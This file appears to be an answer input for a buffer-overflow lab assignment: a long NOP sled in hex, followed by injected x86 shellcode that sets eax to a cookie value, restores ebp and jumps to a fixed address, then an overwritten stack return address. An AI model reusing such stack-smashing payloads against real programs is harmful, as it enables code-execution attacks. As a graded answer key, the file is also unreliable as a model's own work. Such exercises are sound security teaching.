90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
/* 100 */
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
/* 200 */
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 90 90
/* 400 */
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
/* 500 */
90 90 90 90 90 90 90 90 90
b8 da 8f 2f 29       	/* mov    $0x292f8fda,%eax */
8d 6c 24 28          	/* lea    0x28(%esp),%ebp */
68 15 8e 04 08       	/* push   $0x8048e15 */
c3                   	/* ret    */
18 38 68 55		/* 0x55683818 */
